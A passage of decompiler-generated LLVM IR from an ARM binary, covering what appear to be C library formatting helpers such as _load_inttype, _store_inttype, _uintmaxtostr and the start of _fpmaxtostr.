  br i1 %v2_15f94, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_15f8c
  %v1_15f9c = load i32, i32* @r4, align 4
  %v2_15f9c = add i32 %v1_15f9c, 12
  %v3_15f9c = inttoptr i32 %v2_15f9c to i32*
  %v4_15f9c = load i32, i32* %v3_15f9c, align 4
  %v3_15fa0 = add i32 %v1_15f9c, 28
  %v4_15fa0 = inttoptr i32 %v3_15fa0 to i32*
  store i32 %v4_15f9c, i32* %v4_15fa0, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_15f8c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_15f1c, %.thread1
  %v2_15fa8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15fa8, i32* @r4, align 4
  %v1_15fac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15fac

; uselistorder directives
  uselistorder i32 %v2_15f7c, { 1, 0 }
  uselistorder i32 %v0_15f40, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_15ee4, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15f8c, { 1, 0 }
  uselistorder label %dec_label_pc_15f70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15f58, { 1, 0 }
  uselistorder label %dec_label_pc_15f10, { 1, 0 }
  uselistorder label %dec_label_pc_15f04, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_15fb0 = load i32, i32* @r2, align 4
  %v1_15fb0 = icmp slt i32 %v0_15fb0, 0
  %v0_15fb4 = load i32, i32* @r0, align 4
  %v1_15fb8 = and i32 %v0_15fb4, 2048
  %v2_15fec = icmp eq i32 %v1_15fb8, 0
  br i1 %v1_15fb0, label %dec_label_pc_15fec, label %dec_label_pc_15fc0

dec_label_pc_15fc0:                               ; preds = %entry
  br i1 %v2_15fec, label %dec_label_pc_15fc8, label %dec_label_pc_15ff4

dec_label_pc_15fc8:                               ; preds = %dec_label_pc_15fc0
  %v7_15fc8 = icmp eq i32 %v0_15fb4, 256
  %v0_15fcc = load i32, i32* @r1, align 4
  %v1_15fcc = inttoptr i32 %v0_15fcc to i32*
  %v2_15fcc = load i32, i32* %v1_15fcc, align 4
  %v2_15fd0 = urem i32 %v2_15fcc, 256
  %v2_15fd0.v2_15fcc = select i1 %v7_15fc8, i32 %v2_15fd0, i32 %v2_15fcc
  br i1 %v7_15fc8, label %.thread, label %dec_label_pc_15fd8

dec_label_pc_15fd8:                               ; preds = %dec_label_pc_15fc8
  %v7_15fd8 = icmp eq i32 %v0_15fb4, 512
  br i1 %v7_15fd8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15fd8
  %v4_15fe0 = urem i32 %v2_15fd0.v2_15fcc, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15fd8, %dec_label_pc_15fc8, %bb
  %v1_15fe8 = phi i32 [ %v2_15fcc, %dec_label_pc_15fd8 ], [ %v2_15fd0, %dec_label_pc_15fc8 ], [ %v4_15fe0, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_15fe8

dec_label_pc_15fec:                               ; preds = %entry
  br i1 %v2_15fec, label %dec_label_pc_15ffc, label %dec_label_pc_15ff4

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_15fc0, %dec_label_pc_15fec
  %v0_15ff4 = load i32, i32* @r1, align 4
  %v1_15ff4 = inttoptr i32 %v0_15ff4 to i32*
  %v2_15ff4 = load i32, i32* %v1_15ff4, align 4
  %v3_15ff4 = add i32 %v0_15ff4, 4
  %v4_15ff4 = inttoptr i32 %v3_15ff4 to i32*
  %v5_15ff4 = load i32, i32* %v4_15ff4, align 4
  store i32 %v5_15ff4, i32* @r1, align 4
  ret i32 %v2_15ff4

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15fec
  %v7_15ffc = icmp eq i32 %v0_15fb4, 256
  %v0_16000 = load i32, i32* @r1, align 4
  %v1_16000 = inttoptr i32 %v0_16000 to i32*
  %v2_16000 = load i32, i32* %v1_16000, align 4
  %v2_16004 = urem i32 %v2_16000, 256
  %v2_16004.v2_16000 = select i1 %v7_15ffc, i32 %v2_16004, i32 %v2_16000
  br i1 %v7_15ffc, label %.thread2, label %dec_label_pc_1600c

dec_label_pc_1600c:                               ; preds = %dec_label_pc_15ffc
  %v7_1600c = icmp eq i32 %v0_15fb4, 512
  br i1 %v7_1600c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1600c
  %v4_16010 = mul i32 %v2_16004.v2_16000, 65536
  %v4_16014 = sdiv i32 %v4_16010, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1600c, %dec_label_pc_15ffc, %bb5
  %v0_16018 = phi i32 [ %v2_16000, %dec_label_pc_1600c ], [ %v2_16004, %dec_label_pc_15ffc ], [ %v4_16014, %bb5 ]
  %v3_16018 = ashr i32 %v0_16018, 31
  store i32 %v3_16018, i32* @r1, align 4
  ret i32 %v0_16018

; uselistorder directives
  uselistorder i32 %v0_16018, { 1, 0 }
  uselistorder i32 %v2_16004, { 1, 0 }
  uselistorder i32 %v2_16000, { 1, 2, 0 }
  uselistorder i32 %v2_15fd0, { 1, 0 }
  uselistorder i32 %v2_15fcc, { 1, 2, 0 }
  uselistorder i1 %v2_15fec, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ff4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_16020 = icmp eq i32 %arg2, 256
  store i1 %v7_16020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16020, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_16024 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_16024, i8* %tmp3, align 1
  %v1_16028.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_16028 = phi i1 [ false, %entry ], [ %v1_16028.pre, %bb ]
  %v0_16028 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_16028, i32 %v0_16028)
  %v7_1602c = icmp eq i32 %arg2, 2048
  store i1 %v7_1602c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1602c, label %dec_label_pc_16034, label %dec_label_pc_1603c

dec_label_pc_16034:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_16034 = add i32 %tmp2, 4
  %v6_16034 = inttoptr i32 %v5_16034 to i32*
  store i32 %arg4, i32* %v6_16034, align 4
  ret i32 %tmp2

dec_label_pc_1603c:                               ; preds = %bb4
  %v7_1603c = icmp eq i32 %arg2, 512
  store i1 %v7_1603c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1603c, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_1603c
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_1603c
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_16058 = icmp slt i32 %tmp21, 0
  %v2_16058 = icmp eq i32 %tmp21, 0
  store i1 %v2_16058, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_16060 = load i32, i32* @r2, align 4
  store i32 %v0_16060, i32* %r5.global-to-local, align 4
  %v0_16064 = load i32, i32* @r3, align 4
  store i32 %v0_16064, i32* %r6.global-to-local, align 4
  br i1 %v1_16058, label %dec_label_pc_1606c, label %dec_label_pc_1608c

dec_label_pc_1606c:                               ; preds = %entry
  %v1_1606c = icmp slt i32 %v0_16064, 0
  %v2_1606c = icmp eq i32 %v0_16064, 0
  store i1 %v2_1606c, i1* %cpsr_z.global-to-local, align 1
  %v1_16070 = sub i32 0, %tmp21
  store i32 %v1_16070, i32* %r7.global-to-local, align 4
  br i1 %v1_1606c, label %dec_label_pc_16078, label %dec_label_pc_1608c

dec_label_pc_16078:                               ; preds = %dec_label_pc_1606c
  %v1_1607c = sub i32 0, %v0_16060
  store i32 %v1_1607c, i32* %r5.global-to-local, align 4
  %v2_1607c = icmp eq i32 %v0_16060, 0
  %v2_16080 = icmp eq i1 %v2_1607c, false
  %v5_16080 = sext i1 %v2_16080 to i32
  %v6_16080 = sub i32 %v5_16080, %v0_16064
  store i32 %v6_16080, i32* %r6.global-to-local, align 4
  %v19_16080 = icmp eq i32 %v6_16080, 0
  store i1 %v19_16080, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16094

dec_label_pc_1608c:                               ; preds = %dec_label_pc_1606c, %entry
  br label %dec_label_pc_16094

dec_label_pc_16094:                               ; preds = %dec_label_pc_16078, %dec_label_pc_1608c
  %storemerge = phi i8 [ 0, %dec_label_pc_1608c ], [ 1, %dec_label_pc_16078 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1609c = load i32, i32* %r7.global-to-local, align 4
  %v2_160a4 = udiv i32 -1, %v0_1609c
  store i32 %v2_160a4, i32* %fp.global-to-local, align 4
  %v3_160b4 = urem i32 -1, %v0_1609c
  %v1_160b8 = add i32 %v3_160b4, 1
  store i32 %v1_160b8, i32* %sb.global-to-local, align 4
  %v9_160bc = icmp eq i32 %v1_160b8, %v0_1609c
  store i1 %v9_160bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_160bc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16094
  %v1_160c0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_160c0, i32* %sb.global-to-local, align 4
  %v2_160c4 = add i32 %v2_160a4, 1
  store i32 %v2_160c4, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16094, %bb
  %v0_160c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_160c8, i32* %sl.global-to-local, align 4
  %v0_160cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_160cc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_160d0

dec_label_pc_160d0thread-pre-split:               ; preds = %bb25
  %v0_160d0.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_160d4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_160d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_160d0

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160d0thread-pre-split, %.thread
  %v0_16154 = phi i32 [ %v0_160d8.pre, %dec_label_pc_160d0thread-pre-split ], [ %v0_1609c, %.thread ]
  %v0_1614c = phi i32 [ %v0_160d4.pre, %dec_label_pc_160d0thread-pre-split ], [ %v0_160cc, %.thread ]
  %v0_160e8 = phi i32 [ %v0_160d0.pr, %dec_label_pc_160d0thread-pre-split ], [ %v0_160c8, %.thread ]
  %v2_160d0 = icmp eq i32 %v0_160e8, 0
  store i1 %v2_160d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_160d0, label %dec_label_pc_16148, label %dec_label_pc_160e0

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160d0
  %v2_160e4 = udiv i32 %v0_160e8, %v0_16154
  %v3_160e4 = urem i32 %v0_160e8, %v0_16154
  store i32 %v2_160e4, i32* %sl.global-to-local, align 4
  %v2_16104 = udiv i32 %v0_1614c, %v0_16154
  %v3_16104 = urem i32 %v0_1614c, %v0_16154
  %v0_16108 = load i32, i32* %sb.global-to-local, align 4
  %v2_16108 = mul i32 %v0_16108, %v3_160e4
  %v2_16110 = add i32 %v2_16108, %v3_16104
  store i32 %v2_16110, i32* %r5.global-to-local, align 4
  %v0_1611c = load i32, i32* %fp.global-to-local, align 4
  %v2_1611c = mul i32 %v0_1611c, %v3_160e4
  %v2_16124 = add i32 %v2_1611c, %v2_16104
  %v2_1612c = udiv i32 %v2_16110, %v0_16154
  %v2_16134 = add i32 %v2_16124, %v2_1612c
  br label %dec_label_pc_16160

dec_label_pc_16148:                               ; preds = %dec_label_pc_160d0
  %v2_16148 = udiv i32 %v0_1614c, %v0_16154
  br label %dec_label_pc_16160

dec_label_pc_16160:                               ; preds = %dec_label_pc_160e0, %dec_label_pc_16148
  %storemerge28 = phi i32 [ %v2_16148, %dec_label_pc_16148 ], [ %v2_16134, %dec_label_pc_160e0 ]
  %v0_1617c = phi i32 [ %v2_16148, %dec_label_pc_16148 ], [ %v2_16134, %dec_label_pc_160e0 ]
  %v1_1617c = phi i32 [ 0, %dec_label_pc_16148 ], [ %v2_160e4, %dec_label_pc_160e0 ]
  %v2_16110.pn = phi i32 [ %v0_1614c, %dec_label_pc_16148 ], [ %v2_16110, %dec_label_pc_160e0 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_16168 = urem i32 %v2_16110.pn, %v0_16154
  %v2_16164 = icmp ugt i32 %v0_16168, 8
  %v7_16164 = icmp eq i32 %v0_16168, 9
  store i1 %v7_16164, i1* %cpsr_z.global-to-local, align 1
  %v1_1616c = add i32 %v0_16168, 48
  %v0_16174 = load i32, i32* %r8.global-to-local, align 4
  %v1_16174 = add i32 %v0_16174, -1
  store i32 %v1_16174, i32* %r8.global-to-local, align 4
  %v2_16178 = xor i1 %v7_16164, true
  %v3_16178 = and i1 %v2_16164, %v2_16178
  %extract.t = trunc i32 %v1_1616c to i8
  br i1 %v3_16178, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_16160
  %v2_16168 = add i32 %v0_16168, %tmp11
  %extract.t9 = trunc i32 %v2_16168 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_16160, %bb24
  %v0_16180.off0 = phi i8 [ %extract.t, %dec_label_pc_16160 ], [ %extract.t9, %bb24 ]
  %v2_1617c = or i32 %v0_1617c, %v1_1617c
  %v4_1617c = icmp eq i32 %v2_1617c, 0
  store i1 %v4_1617c, i1* %cpsr_z.global-to-local, align 1
  %v3_16180 = inttoptr i32 %v1_16174 to i8*
  store i8 %v0_16180.off0, i8* %v3_16180, align 1
  %v0_16184 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16184, label %dec_label_pc_16188, label %dec_label_pc_160d0thread-pre-split

dec_label_pc_16188:                               ; preds = %bb25
  %v4_1618810 = zext i8 %storemerge to i32
  store i32 %v4_1618810, i32* @r3, align 4
  %v2_1618c = icmp eq i8 %storemerge, 0
  store i1 %v2_1618c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1618c, label %dec_label_pc_16188..thread2_crit_edge, label %bb26

dec_label_pc_16188..thread2_crit_edge:            ; preds = %dec_label_pc_16188
  %v0_16198.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_16188
  store i32 45, i32* @r3, align 4
  %v3_16194 = load i32, i32* %r8.global-to-local, align 4
  %v4_16194 = add i32 %v3_16194, -1
  %v5_16194 = inttoptr i32 %v4_16194 to i8*
  store i8 45, i8* %v5_16194, align 1
  %v6_16194 = load i32, i32* %r8.global-to-local, align 4
  %v7_16194 = add i32 %v6_16194, -1
  store i32 %v7_16194, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16188..thread2_crit_edge, %bb26
  %v0_16198 = phi i32 [ %v0_16198.pre, %dec_label_pc_16188..thread2_crit_edge ], [ %v7_16194, %bb26 ]
  ret i32 %v0_16198

; uselistorder directives
  uselistorder i32 %v0_16168, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16154, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_16060, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 5, 3, 6, 0, 1, 4, 8, 7, 2, 9, 10 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_16160, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16094, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_161a8 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_161b4 = add i32 %arg4, 8
  %v2_161b4 = inttoptr i32 %v1_161b4 to i8*
  %v3_161b4 = load i8, i8* %v2_161b4, align 1
  %v4_161b4 = zext i8 %v3_161b4 to i32
  store i32 %v4_161b4, i32* %sb.global-to-local, align 4
  %v1_161b8 = or i32 %v4_161b4, 32
  %v7_161bc = icmp eq i32 %v1_161b8, 97
  store i1 %v7_161bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_161d4 = inttoptr i32 %arg4 to i32*
  %v2_161d4 = load i32, i32* %v1_161d4, align 4
  store i32 %v2_161d4, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_161dc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_161dc, i32* %r6.global-to-local, align 4
  store i32 67276, i32* %ip.global-to-local, align 4
  br i1 %v7_161bc, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_161e4 = add nuw nsw i32 %v4_161b4, 6
  store i32 %v2_161e4, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_161f4 = phi i32 [ %v0_161dc, %entry ], [ %v2_161e4, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_161ec = add i32 %arg4, 12
  %v2_161ec = inttoptr i32 %v1_161ec to i32*
  %v3_161ec = load i32, i32* %v2_161ec, align 4
  store i32 %v3_161ec, i32* %r2.global-to-local, align 4
  %v1_161f0 = add i32 %arg4, 4
  %v2_161f0 = inttoptr i32 %v1_161f0 to i32*
  %v3_161f0 = load i32, i32* %v2_161f0, align 4
  store i32 %v3_161f0, i32* @lr, align 4
  br i1 %v7_161bc, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_161f4 = urem i32 %v1_161f4, 256
  store i32 %v2_161f4, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_161f8 = icmp slt i32 %v2_161d4, 0
  %v2_161f8 = icmp eq i32 %v2_161d4, 0
  store i1 %v2_161f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_161f8, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_16208 = and i32 %v3_161ec, 2
  %v2_16208 = icmp eq i32 %v1_16208, 0
  store i1 %v2_16208, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_16208, label %dec_label_pc_16220, label %dec_label_pc_1622c

dec_label_pc_16220:                               ; preds = %bb205
  %v1_16220 = urem i32 %v3_161ec, 2
  %v2_16220 = icmp eq i32 %v1_16220, 0
  store i1 %v2_16220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16220, label %dec_label_pc_16230, label %dec_label_pc_1622c

dec_label_pc_1622c:                               ; preds = %dec_label_pc_16220, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_16220 ]
  %v0_1622c.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_16220 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1622c.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_16230

dec_label_pc_16230:                               ; preds = %dec_label_pc_16220, %dec_label_pc_1622c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_161dc, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_161dc, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_1624c = fptrunc double %arg2 to float
  %v2_1624c = bitcast float %v1_1624c to i32
  %v9_1624c = call i32 @__aeabi_dcmpeq(i32 %v2_1624c, i32 %v0_161dc, i32 %v2_1624c, i32 %v0_161dc, i32 0)
  store i32 %v9_1624c, i32* %r0.global-to-local, align 4
  %v2_16250 = icmp eq i32 %v9_1624c, 0
  store i1 %v2_16250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16250, label %bb207, label %dec_label_pc_16260

bb207:                                            ; preds = %dec_label_pc_16230
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16314

dec_label_pc_16260:                               ; preds = %dec_label_pc_16230
  %v0_16260 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16260, i32* @r0, align 4
  %v0_16264 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16264, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16270 = call i32 @__aeabi_dcmpeq(i32 %v0_16260, i32 %v0_16264, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_16270, i32* %r0.global-to-local, align 4
  %v2_16274 = icmp eq i32 %v7_16270, 0
  store i1 %v2_16274, i1* %cpsr_z.global-to-local, align 1
  %v0_162bc = load i32, i32* %r5.global-to-local, align 4
  %v1_162bc = sext i32 %v0_162bc to i64
  %v2_162bc = bitcast i64 %v1_162bc to double
  br i1 %v2_16274, label %dec_label_pc_162bc, label %dec_label_pc_1627c

dec_label_pc_1627c:                               ; preds = %dec_label_pc_16260
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_1628c = fdiv double 0.000000e+00, %v2_162bc
  %v10_1628c = fptrunc double %v9_1628c to float
  %v11_1628c = bitcast float %v10_1628c to i32
  store i32 %v11_1628c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_16298 = call i32 @__aeabi_dcmplt(i32 %v11_1628c, i32 1072693248, i32 0, i32 0)
  store i32 %v4_16298, i32* %r0.global-to-local, align 4
  %v2_1629c = icmp eq i32 %v4_16298, 0
  store i1 %v2_1629c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1629c, label %bb208, label %dec_label_pc_162a8

bb208:                                            ; preds = %dec_label_pc_1627c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16488

dec_label_pc_162a8:                               ; preds = %dec_label_pc_1627c
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_16488

dec_label_pc_162bc:                               ; preds = %dec_label_pc_16260
  store i32 %v0_162bc, i32* @r0, align 4
  %v0_162c0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_162c0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_162cc = fptrunc double %v2_162bc to float
  %v2_162cc = bitcast float %v1_162cc to i32
  %v6_162cc = call i32 @__aeabi_dcmplt(i32 %v2_162cc, i32 %v0_162c0, i32 0, i32 0)
  store i32 %v6_162cc, i32* %r0.global-to-local, align 4
  %v2_162d0 = icmp eq i32 %v6_162cc, 0
  store i1 %v2_162d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_162d0, label %dec_label_pc_162bc..thread9_crit_edge, label %bb209

dec_label_pc_162bc..thread9_crit_edge:            ; preds = %dec_label_pc_162bc
  %v0_162f0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_162bc
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_162d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_162d8 = sub i32 0, %v1_162d8
  store i32 %v2_162d8, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_162d8, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_162bc..thread9_crit_edge, %bb209
  %v0_162f0 = phi i32 [ %v0_162f0.pre, %dec_label_pc_162bc..thread9_crit_edge ], [ %v2_162d8, %bb209 ]
  %v0_162ec = load i32, i32* %r5.global-to-local, align 4
  %v1_162ec = sext i32 %v0_162ec to i64
  %v2_162ec = bitcast i64 %v1_162ec to double
  %v9_162f4 = fmul double %v2_162ec, 0.000000e+00
  %v10_162f4 = fptrunc double %v9_162f4 to float
  %v11_162f4 = bitcast float %v10_162f4 to i32
  store i32 %v11_162f4, i32* @r2, align 4
  store i32 %v0_162f0, i32* %r3.global-to-local, align 4
  store i32 %v0_162ec, i32* @r0, align 4
  store i32 %v0_162f0, i32* %r1.global-to-local, align 4
  %v7_16308 = call i32 @__aeabi_dcmpeq(i32 %v0_162ec, i32 %v0_162f0, i32 %v11_162f4, i32 %v0_162f0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_16308, i32* %r0.global-to-local, align 4
  %v2_1630c = icmp eq i32 %v7_16308, 0
  store i1 %v2_1630c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1630c, label %dec_label_pc_16360, label %.thread9.dec_label_pc_16314_crit_edge

.thread9.dec_label_pc_16314_crit_edge:            ; preds = %.thread9
  %v3_16314.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_16314

dec_label_pc_16314:                               ; preds = %bb207, %.thread9.dec_label_pc_16314_crit_edge
  %v3_16314 = phi i32 [ %v3_16314.pre, %.thread9.dec_label_pc_16314_crit_edge ], [ %arg4, %bb207 ]
  %v1_16258.v0_162445 = phi i32 [ 0, %.thread9.dec_label_pc_16314_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_16314, i32* %ip.global-to-local, align 4
  %v2_1631c = add i32 %v3_16314, 16
  %v3_1631c = inttoptr i32 %v2_1631c to i32*
  store i32 32, i32* %v3_1631c, align 4
  %v0_16324 = load i32, i32* %sb.global-to-local, align 4
  %v7_16324 = icmp eq i32 %v0_16324, 96
  store i1 %v7_16324, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
